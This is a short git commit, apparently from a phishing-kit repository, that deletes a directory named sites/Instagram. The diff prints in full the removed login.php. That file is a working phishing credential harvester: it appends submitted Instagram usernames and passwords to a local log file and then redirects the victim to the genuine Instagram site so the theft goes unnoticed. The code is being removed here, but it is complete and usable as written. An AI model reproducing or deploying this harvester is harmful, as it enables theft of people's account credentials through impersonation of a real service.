73756c8a2d7ded78b5a987e5e5f68fdc13e10aae
THE SILENT HACKER RAJ <70suman28@gmail.com>
2025-07-14 11:30:36 +0530

    Delete sites/Instagram directory

--- sites/Instagram/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("log.txt", "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n", FILE_APPEND);
-header("Location: https://Instagram.com");
-exit();
-?>
